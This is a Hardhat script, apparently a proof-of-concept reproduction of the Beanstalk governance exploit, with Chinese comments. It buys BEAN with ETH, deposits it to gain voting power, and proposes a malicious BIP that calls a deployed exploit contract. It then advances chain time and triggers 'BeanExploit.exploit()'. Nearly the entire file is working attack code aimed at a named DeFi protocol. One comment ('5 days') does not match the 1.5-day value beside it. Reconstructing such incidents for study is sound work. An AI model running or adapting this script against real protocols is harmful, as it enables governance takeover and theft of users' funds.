const { ethers } = require("hardhat");

async function main() {


  const [signer] = await ethers.getSigners();

  const routeraddr = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";//uniswap的router合约
  const routerabi = ["function swapExactETHForTokens(uint256 amountOutMin, address[] path, address to, uint256 deadline) external payable"];
  const uniswapRouter = new ethers.Contract(routeraddr,routerabi,signer);

  // 部署恶意BIP合约
  const ExploitBIP = await ethers.getContractFactory("ExploitBIP");
  const exploitBip = await ExploitBIP.deploy();
  await exploitBip.deployed();
  console.log("exploitBIP address:",exploitBip.address);

  // 投入eth 换成 bean
  await uniswapRouter.swapExactETHForTokens(
    0,
    ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","0xDC59ac4FeFa32293A95889Dc396682858d52e5Db"],  // weth , bean 
    signer.address,
    BigInt(Math.round(Date.now() / 1000)), 
    {value: ethers.utils.parseEther("77")}
  ) 


  const beansAddr = "0xDC59ac4FeFa32293A95889Dc396682858d52e5Db";
  const erc20Abi = [
      "function approve(address, uint256) external", 
      "function balanceOf(address) external view returns (uint256)"
  ];
  const beans = new ethers.Contract(beansAddr, erc20Abi, signer);
  const BEANSTALKaddr = "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5";
  const BEANSTALKabi = [
    "function depositBeans(uint256 amount) external",
    "function propose(tuple(address,uint8,bytes4[])[] calldata cut,address _init,bytes calldata _calldata,uint8 _pauseOrUnpause)",
    "function numberOfBips() external view returns (uint32)"
  ];
  const beanstalkProtocol = new ethers.Contract(BEANSTALKaddr, BEANSTALKabi, signer);
  await beans.approve(BEANSTALKaddr, BigInt(99999999999999));
  // 提交恶意提案
  await beanstalkProtocol.depositBeans(await beans.balanceOf(signer.address));
  await beanstalkProtocol.propose([], exploitBip.address, exploitBip.interface.encodeFunctionData("init"), 3);

  await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]); // 5 days

  const BeanExploit = await ethers.getContractFactory("BeanExploit");
  const beanExploit = await BeanExploit.deploy();
  await beanExploit.deployed();

  console.log("beanExploit address: ",beanExploit.address);

  await beanExploit.exploit();



}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
